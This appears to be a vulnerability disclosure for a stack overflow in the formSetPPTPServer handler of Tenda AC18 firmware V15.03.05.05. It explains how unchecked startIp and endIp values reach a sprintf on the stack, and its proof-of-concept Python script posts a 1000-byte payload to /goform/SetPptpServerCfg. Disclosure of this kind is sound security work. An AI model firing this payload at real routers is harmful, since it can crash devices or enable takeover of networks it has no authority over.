## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a stack overflow vulnerability in the `formSetPPTPServer` function. The `v20` variable receives the `startIP` parameter  and the `v19` variable receives the `endIP` parameter from two POST requests. the value of `startIp` is formatted using the `sscanf` function with the format `%[^.].%[^.].%[^.].%s`. Then variable `v13`, `v14` and `v15` is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `startIP` and `endIP` can trigger this security vulnerability.

![image-20240306172220665](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306172220665.png)

![image-20240306172206351](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306172206351.png)

![image-20240306172158618](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306172158618.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetPptpServerCfg"
payload = 'a'*1000

data = {"startIp": payload,"endIp": 1}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240306172306041](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306172306041.png)